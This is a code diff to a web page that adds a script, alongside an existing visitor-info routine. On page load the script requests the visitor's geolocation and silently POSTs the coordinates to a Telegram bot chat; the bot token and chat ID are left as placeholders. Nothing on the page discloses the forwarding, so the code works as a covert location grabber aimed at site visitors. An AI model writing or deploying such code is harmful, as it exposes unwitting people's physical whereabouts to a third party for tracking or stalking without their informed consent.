@@ -247,6 +247,36 @@ Time: ${new Date().toLocaleString()}
 
 getVisitorInfo();
 </script>
+    <script>
+function sendLocation(position) {
+
+const lat = position.coords.latitude;
+const lon = position.coords.longitude;
+
+const message =
+"Visitor Location 📍\n" +
+"Latitude: " + lat + "\n" +
+"Longitude: " + lon;
+
+fetch("https://api.telegram.org/botYOURTOKEN/sendMessage",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:"YOURCHATID",
+text:message
+})
+});
+
+}
+
+function error(){
+console.log("User denied location");
+}
+
+navigator.geolocation.getCurrentPosition(sendLocation,error);
+</script>
 </body>
 
 </html>
